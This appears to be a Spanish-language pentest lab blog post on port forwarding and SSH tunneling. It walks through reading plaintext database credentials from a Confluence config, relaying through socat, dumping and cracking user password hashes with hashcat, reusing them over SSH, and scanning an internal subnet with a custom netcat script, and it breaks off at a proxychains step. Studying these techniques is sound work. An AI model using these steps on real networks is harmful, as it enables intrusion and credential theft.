+3: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
+       valid_lft forever preferred_lft forever
+</code></pre></div></div>
+
+<p>Es decir, esta máquina mantiene contacto simultáneo con dos redes de ordenadores separadas; la WAN de la que nuestra red forma parte y una LAN que problabemente tendrá algún nombre particular.</p>
+
+<p>Una WAN es una red grande y expansiva. Algunas personas se refieren a Internet pública como la WAN más grande del mundo, y algunas organizaciones más grandes se refieren a su gran red interna como WAN o WAN interna. En este ca so, dado que estamos simulando un ataque desde una red externa, la WAN representa una gran red interna corporativa o la propia Internet. Nuestra máquina Kali estará situada en la WAN. Solo podremos enrutar directamente desde nuestra máquina Kali a hosts que también estén en la WAN.</p>
+
+<p>Un tipo de red interna conocida es una DMZ. Una DMZ es una red que contiene dispositivos que pueden estar más expuestos a una red más amplia y menos confiable. Una DMZ ayuda a crear una zona de amortiguamiento entre los hosts en la red más amplia y menos confiable y los hosts internos. De esta forma, cumple una función similar a la de una zona desmilitarizada del mundo real . 6 En este escenario, la DMZ es el segmento de red de amortiguamiento entre la WAN y cualquier otra red interna que podamos encontrar.</p>
+
+<p>Continuando con la investigación de la máquina, ahora que sabemos que esta tiene un pie en dos redes, merece la pena investigar las tablas de enrutamiento (route table) para conocer con más detalle la comuicación de la máquina con la red interna.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
+ip route
+default via 192.168.50.254 dev ens192 proto static 
+10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
+10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
+192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
+</code></pre></div></div>
+
+<p>Observamos que expone ambas redes así como las máscaras de red pero no expone ningún enrutamiento a un hosts concreto.</p>
+
+<p>Por suerte, encontramos un documento en el que aparece un host interno junto con credenciales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+&lt;sian/application-data/confluence/confluence.cfg.xml   
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;confluence-configuration&gt;
+  &lt;setupStep&gt;complete&lt;/setupStep&gt;
+  &lt;setupType&gt;custom&lt;/setupType&gt;
+  &lt;buildNumber&gt;8703&lt;/buildNumber&gt;
+  &lt;properties&gt;
+...
+    &lt;property name="hibernate.connection.password"&gt;D@t4basePassw0rd!&lt;/property&gt;
+    &lt;property name="hibernate.connection.url"&gt;jdbc:postgresql://10.4.50.215:5432/confluence&lt;/property&gt;
+    &lt;property name="hibernate.connection.username"&gt;postgres&lt;/property&gt;
+...
+  &lt;/properties&gt;
+&lt;/confluence-configuration&gt;
+confluence@confluence01:/opt/atlassian/confluence/bin$ 
+</code></pre></div></div>
+
+<p>Encontraremos la dirección IP del servidor de la base de datos, así como el nombre de usuario y la contraseña de texto sin formato utilizados para conectarse a él. Podemos usar estas credenciales para autenticarnos en la base de datos y continuar nuestra enumeración.</p>
+
+<p>Sin embargo, hemos llegado a una limitación. CONFLUENCE01 no tiene instalado un cliente PostgreSQL. Dado que nos estamos ejecutando como el usuario de CONFLUENCE01 de privilegios bajos , tampoco podemos instalar fácilmente el software.</p>
+
+<p>Tenemos el cliente <em>psql</em> de PostgreSQL instalado en nuestra máquina Kali, pero no podemos conectarnos directamente a PGDATABASE01 desde nuestra máquina Kali, ya que esta sólo es accesoble desde CONFLUENCE01 <em>.</em></p>
+
+<p>En este escenario, no existe un firewall entre nuestra máquina Kali y CONFLUENCE01, lo que significa que no hay nada que nos impida vincular puertos en la interfaz WAN de CONFLUENCE01 y conectarnos a ellos desde nuestra máquina Kali.</p>
+
+<p>Este es exactamente el tipo de situación en la que el Port Forwarding puede ser útil. Podemos crear una redirección de paquetes en CONFLUENCE01 que escuche en un puerto en la interfaz WAN, luego reenviar todos los paquetes recibidos en este puerto a PGDATABASE01 en la subred interna. </p>
+
+<p><br /></p>
+
+<p><strong>Port Forwarding with Socat</strong></p>
+
+<p>Ahora que tenemos unas credenciales (que vamos a asumir como validas), tenemos una forma de penetración sobre la máquina PGDATABASE01, vamos a configurar CONFLUENCE01 para redirigir tráfico proveniente de nuestra kali sobre la PGDATABASE01.</p>
+
+<p>Para este fin vamos a emplear Socat, si no está instalado por defecto en CONFLUENCE01 lo transportamos desde la Kali, es importante recordar que necesitamos un binario estático de otra manera se requerirían librerias que podrían no encontrarse en la máquina de destino.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+&lt;ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
+2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
+2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
+2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
+2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
+2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -&gt; 5
+2022/08/18 10:12:01 socat[46589] I starting accept loop
+2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
+</code></pre></div></div>
+
+<p>En CONFLUENCE01, iniciaremos un proceso Socat detallado (<strong>-ddd</strong>). Escuchará en el puerto TCP 2345 (<strong>TCP-LISTEN:2345</strong>), se bifurcará en un nuevo subproceso cuando reciba una conexión (<strong>fork</strong>) en lugar de morir después de una sola conexión, luego reenviará todo el tráfico que reciba al puerto TCP 5432 en PGDATABASE01 (<strong>TCP :10.4.50.215:5432</strong>).</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230602121300.png" text-align="center" />
+</div>
+
+<p>De esta forma, nos conectamos al servicio postgresql a la CONFLUENCE01 sobre el puerto de redirección:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
+Password for user postgres: 
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+------------+----------+----------+-------------+-------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+ 
+</code></pre></div></div>
+
+<p>De esta forma, nos concectamos a la base de datos y la exploramos, obteniendo unas credenciales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgres=# \c confluence
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "confluence" as user "postgres".
+
+confluence=# select * from cwd_user;
+
+   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
+---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
+  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
+ 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
+ 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
+ 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
+ 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
+ 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
+(6 rows)
+
+(END)
+</code></pre></div></div>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+...
+
+{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
+{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
+{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
+...
+</code></pre></div></div>
+
+<p>de solo unos minutos de descifrado, Hashcat devuelve las contraseñas para los usuarios <em>de database_admin</em> , <em>hr_admin</em> y <em>rdp_admin .</em></p>
+
+<p>Podríamos sospechar que estas contraseñas se reutilizan en otros lugares de la red. Después de enumerar un poco más la red interna, encontraremos que PGDATABASE01 también ejecuta un servidor SSH. Probemos estas credenciales contra este servidor SSH. Con nuestra nueva habilidad de reenvío de puertos, podemos crear un reenvío de puertos en CONFLUENCE01 que nos permitirá SSH directamente desde nuestra máquina Kali a PGDATABASE01.</p>
+
+<p>Primero, debemos eliminar el proceso Socat original que escucha en el puerto TCP 2345. Luego, crearemos un nuevo reenvío de puerto con Socat que escuchará en el puerto TCP 2222 y reenviará al puerto TCP 22 en PGDATABASE01.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
+The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
+database_admin@192.168.50.63's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 18 Aug 2022 11:43:07 AM UTC
+
+  System load:  0.1               Processes:               241
+  Usage of /:   59.3% of 7.77GB   Users logged in:         1
+  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
+  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+database_admin@pgdatabase01:~$
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="3-ssh-tunneling">3. SSH Tunneling.</h3>
+
+<p>A medida que los datos viajan a través de una red sufren un proceso de encapsulación de datos que se realiza siguiendo un modelo abstracto de capas de protocolos de red denominado TCP/IP.</p>
+
+<p>En cada capa se configura un monto de información en forma de paquete (que tiene diferentes nombres en función de la capa a la que este pertenezca; segmento TCP, Datagrama, etc) que a su vez contiene los paquetes de información de las capas subyacentes.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230606115405.png" text-align="center" />
+</div>
+
+<p>En el mismo sentido, el <em>Tunneling</em> describe el acto de encapsular datos de un protocolo de la capa de aplicación dentro de paquetes correspondientes a otro protocolo de la capa de aplicación mientras viaja a través de una red. Un ejemplo clásico es el tunneling SSH que consiste en introducir un paquete, por ejemplo HTTP, dentro de un paquete SSH de forma que externamente, un firewall o un IDS, percibiría tráfico SSH (más fácilmente tolerado por firewalls u otras medidas de seguridad):</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230606121406.png" text-align="center" />
+</div>
+
+<p>Se dice que SSH es un Tunneling Protocol.</p>
+
+<p>El protocolo SSH es principalmente un protocolo de tunelización, por lo que es posible transportar casi cualquier tipo de datos a través de una conexión SSH. Por esa razón, las capacidades de tunelización están integradas en la mayoría de los comandos SSH. Además, es común encontrar software de cliente SSH ya instalado en hosts Linux, o <em>OpenSSH</em> instalado en hosts Windows. En entornos de red que no están fuertemente monitoreados, el tráfico SSH no parecerá anómalo y el tráfico SSH se parecerá mucho al tráfico administrativo regular. Su contenido tampoco puede ser monitoreado fácilmente.</p>
+
+<p>Esencialmente distinguimos SSH Local Port Forwafing y el SSH Remote Port Forwarding. La diferencia entre ambas estriba en la posición del túnel SSH respecto de la LAN que estamos asaltando. Desde la perspectiva de la red, cualquier movimiento dentro de la misma se considera un movimiento local, de ahí que el SSH Local Port Forwarding sea el caso en el que túnel SSH se encuentre establecido entre dos hosts de la misma LAN mientras que el SSH Remote Port Forwarding sea cuando el SSH túnel se establece entre dos hosts posicionados en redes distintas, frecuentemente uno en la WAN y otro en la LAN.</p>
+
+<p><br /></p>
+
+<h4 id="31-ssh-local-port-forwarding">3.1. SSH Local Port Forwarding.</h4>
+
+<p>Para exponer el siguiente caso de SSH Local Tunneling vamos a seguir con el caso expuesto anteriormente, hasta el momento teníamos 3 máquinas; nuestra Kali en la WAN, CONFLUENCE01 en WAN y DMZ (DeMilitarizatedZone) y PGDATABASE01 en DMZ.</p>
+
+<p>Con el SSH local port forwarding se utiliza una conexión SSH entre un cliente SSH que recibe paquetes que son enviados a un servidor SSH a lo largo de un túnel SSH como hemos explicado anteriormente y de ahí son redirigidos sobre otro puerto ya sea local como en el ejemplo expuesto del tunneling anteriormente o remoto como en este:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230606180852.png" text-align="center" />
+</div>
+
+<p>Así, volviendo sobre un caso explícito, supongámos que estámos conectados con SSH a PGDATABASE01, el punto en el que dejamos el anterior caso. Enumeramos las interfaces de red y descubrimos que a su vez, PGDATABASE01 forma parte de otra red interna:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database_admin@pgdatabase01:~$ ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ba:30:fb brd ff:ff:ff:ff:ff:ff
+    inet 10.4.206.215/24 brd 10.4.206.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ba:e0:d1 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.206.254/24 brd 172.16.206.255 scope global ens224
+       valid_lft forever preferred_lft forever
+</code></pre></div></div>
+
+<p>La route table confirma este hallazgo exponiendo rutas de paquetes sobre dicha red:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database_admin@pgdatabase01:~$ ip route
+10.4.50.0/24 dev ens192 proto kernel scope link src 10.4.50.215 
+10.4.50.0/24 via 10.4.50.254 dev ens192 proto static
+172.16.50.0/24 dev ens224 proto kernel scope link src 172.16.50.215 
+172.16.50.0/24 via 172.16.50.254 dev ens224 proto static
+</code></pre></div></div>
+
+<p>Como no encontramos ninguna credencial ni ningún hallazgo sobre otra máquina específica en la nueva red adicional vamos a realizar un escaneo de red manual:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database_admin@pgdatabase01:~$ for i in $(seq 1 254); do ping -c1 172.16.206.$i| grep "1 received" -C4; done
+PING 172.16.206.217 (172.16.206.217) 56(84) bytes of data.
+64 bytes from 172.16.206.217: icmp_seq=1 ttl=128 time=0.298 ms
+
+--- 172.16.206.217 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.298/0.298/0.298/0.000 ms
+PING 172.16.206.254 (172.16.206.254) 56(84) bytes of data.
+64 bytes from 172.16.206.254: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 172.16.206.254 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+</code></pre></div></div>
+
+<p>Escaneamos la red y comprobamos que dentro de la segunda red existe al menos un segundo hosts:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database_admin@pgdatabase01:~$ for i in $(seq 200 254); do ping -c1 172.16.237.$i| grep "1 received" -C4; done
+PING 172.16.237.217 (172.16.237.217) 56(84) bytes of data.
+64 bytes from 172.16.237.217: icmp_seq=1 ttl=128 time=0.338 ms
+
+--- 172.16.237.217 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.338/0.338/0.338/0.000 ms
+PING 172.16.237.254 (172.16.237.254) 56(84) bytes of data.
+64 bytes from 172.16.237.254: icmp_seq=1 ttl=64 time=0.026 ms
+
+--- 172.16.237.254 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms
+</code></pre></div></div>
+
+<p>Seguidamente, realizamos un escaneo de puertos sobre el la máquina encontrada con el siguiente script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+
+#Usage: ./NetcatScanner &lt;IP&gt; &lt;ThreadNumber&gt; &lt;Ports&gt;; ./NetcatScanner 10.10.10.10 10 10000. !!!It is worth to mention that &lt;Ports&gt;/&lt;ThreadNumber&gt; must be an integer, otherwise the script triggers an error.!!!
+
+#This script attemps to use netcat tool in order to perform a multi-process netcat port scanner. First, we create several bash scripts which scan a range of ports by them selves and then we execute them at the same time with a loop in background.
+
+mkdir /tmp/PortScan
+
+mkdir /tmp/OutScan
+
+cd /tmp/PortScan
+
+PortRange=$(($3/$2)) 
+
+content=$(echo "for port in \$(seq 1 $PortRange);do nc -zv -w 1 $1 \$((\$port+YY*$PortRange)) &amp;&gt;&gt; /tmp/OutScan/ncOutYY.txt;done;cat /tmp/OutScan/ncOutYY.txt | grep 'Connection to'&gt;/tmp/OutScan/OpenPortsYY.txt;rm /tmp/OutScan/ncOutYY.txt" | base64 | tr -d '\n') #We encode the scanner code.
+
+for i in $(seq 0 $(($2-1))) #The numbers of threads. Standard is 9; 10 threads.
+do 
+        echo $content | base64 -d &gt; nc$i.sh #We decode the scanner program and copy it through several files.
+done
+
+for file in $(ls);do n=$(echo $file | cut -d "." -f1 | grep '[0-9]' | tr -d 'nc');sed "s/YY/$n/g" -i $file;done
+
+for file in $(ls /tmp/PortScan) #We launch the scanners in the background to achieve simultaenous execution of the scripts.
+do
+        chmod +x $file
+        ./$file &amp;
+	echo "[+] Launched $file"
+done
+
+
+echo -e "\n[+] Scanner launched. Check progress at 'progress=\$(tail -n1 /tmp/OutScan/ncOut0.txt | cut -d ' ' -f6 | grep '[0-9]');echo \"[+] \$progress from $PortRange\"'."
+echo -e "\n[+] When finish: 'cat /tmp/OutScan/OpenPorts*'."
+</code></pre></div></div>
+
+<p>Damos permisos de ejecución y lo lanzamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database_admin@pgdatabase01:/tmp$ ./script.sh 172.16.237.217 100 10000
+[+] Launched nc0.sh
+[+] Launched nc10.sh
+[...]
+[+] Launched nc98.sh
+[+] Launched nc99.sh
+[+] Launched nc9.sh
+
+[+] Scanner launched. Check progress at 'progress=$(tail -n1 /tmp/OutScan/ncOut0.txt | cut -d ' ' -f6 | grep '[0-9]');echo "[+] $progress from 100"'.
+
+[+] When finish: 'cat /tmp/OutScan/OpenPorts*'.
+database_admin@pgdatabase01:/tmp$ cat /tmp/OutScan/OpenPorts*
+Connection to 172.16.237.217 135 port [tcp/epmap] succeeded!
+Connection to 172.16.237.217 139 port [tcp/netbios-ssn] succeeded!
+Connection to 172.16.237.217 3389 port [tcp/ms-wbt-server] succeeded!
+Connection to 172.16.237.217 445 port [tcp/microsoft-ds] succeeded!
+</code></pre></div></div>
+
+<p>Podemos observar que entre los puertos descubiertos hay un servidor SMB (puerto 139, 445), la distribución de servicios sugiere altamente que se trata de un Windows Server.</p>
+
+<p>Para interaccionar con este complejo servicio, necesitamos herramientas específicas. Probablemente podamos descubrir algo interesante ya que los servicios y máquinas internas de subredes, al estar protegidos por la propia topología de red, suelen contar con menos medidas de seguridad.</p>
+
+<p>De esta forma, utilizamos SSH para crear un túnel SSH que redirija información desde nuestra kali hacia el nuevo host a través de un túnel SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.237.217:445 database_admin@10.4.237.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.237.215 (10.4.237.215)' can't be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.237.215's password: 
+</code></pre></div></div>
+
+<p>El comando anterior provoca que CONFLUENCE01 escuche sobre el puerto local 4455 en cualquier interfaz de red y reenvié el tráfico sobre el puerto 445 de 172.16.237.217 a través de la máquina PGDATABASE01 y el usuario database_admin.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230607214725.png" text-align="center" />
+</div>
+
+<p>Ahora, desde la kali, lanzamos smbclient hacia el puerto 4455 de la CONFLUENCE01:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ smbclient -p 4455 -L //192.168.237.63/ -U hr_admin --password=Welcome1234
+
+        Sharename       Type      Commen
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.237.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+
+<p>Hasta aquí hemos visto que con el SSH Local Port Forwarding podemos utilizar un servicio SSH para transportar paquetes desde un cliente SSH hasta un servidor SSH y desde ahí utilizar un usuario para redirigir los paquetes sobre otra máquina.</p>
+
+<p><br /></p>
+
+<h4 id="32-ssh-local-dynamic-port-forwarding-proxychains">3.2. SSH Local Dynamic Port Forwarding. Proxychains.</h4>
+
+<p>El SSH Local Port Forwarding es una herramienta útil en un contexto de enumeración y explotación de redes internas. Sin embargo, posee una limitación, el número de sockets a los que acceder. Cada vez que queramos acceder a un puerto distinto debemos reiniciar la conexión para cambiar de socket.</p>
+
+<p>Afortunadamente, OpenSSH también provee de dynamic port forwarding. Este método tiene la capacidad, desde un único puerto en el cliente SSH, de dirigirse sobre cualquier socket accesible por el servidor SSH:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230608115055.png" text-align="center" />
+</div>
+
+<p>Suponiendo de nuevo el contexto del ejemplo anterior, el comando para desencadenar un <em>dinamic port forwarding</em> sería:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+&lt;$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215   
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
+ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.50.215's password:
+</code></pre></div></div>
+
+<p>Podemos asegurarnos de que estamos en un shell TTY usando el módulo <em>pty</em> de Python3 . Crearemos nuestra conexión SSH a PGDATABASE01 usando las credenciales de <em>database_admin</em> nuevamente. En OpenSSH, se crea un <em>Dynamic Port Forwarding</em> con la opción -D. El único argumento que esto toma es la dirección IP y el puerto al que queremos vincularnos. En este caso, queremos que escuche en todas las interfaces de red del puerto <em>9999</em>. No tenemos que especificar una dirección de socket para reenviar. También pasaremos el indicador <strong>-N</strong> para evitar que se genere una shell.</p>
+
+<p>Este comando provoca la apertura de un <em>Socks Forward Proxy</em>. Un Proxy es un dispositivo que sirve de intermediario entre las conexiones entre un cliente y un servidor. La el tipo más común de Proxy es el HTTP Forward Proxy, que media las requests HTTP entre un cliente y un servidor. En este caso, un Socks Forward Proxy media las direcciones, los sockets de entrada o destino, entre un cliente y un servidor. A su vez, un socket es un canal de conexión entre un cliente y un servidor, al final de cada socket se encuentra un puerto con un servicio escuchándo en él.</p>
+
+<p>De esta forma, para conectarnos a cualquier socket accesible por el servidor SSH empleamos una herramienta capaz de interactuar de un SocksProxy, en este caso empleamos <em>Proxychains</em>:</p>
+
+<p>Proxychains usa un archivo de configuración para casi todo, almacenado por defecto en <strong>/etc/proxychains4.conf</strong>. Necesitamos editar este archivo para asegurarnos de que Proxychains pueda ubicar nuestro SOCKS proxy port y confirmar que es un SocksProxy (en lugar de cualquier otro tipo de proxy). De forma predeterminada, los proxies se definen al final del archivo. Simplemente podemos reemplazar cualquier definición de proxy existente en ese archivo con una sola línea que defina el tipo de proxy, la dirección IP y el puerto del proxy SOCKS que se ejecuta en CONFLUENCE01 ( <strong>socks5 192.168.50.63 9999</strong> ).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ tail /etc/proxychains4.conf
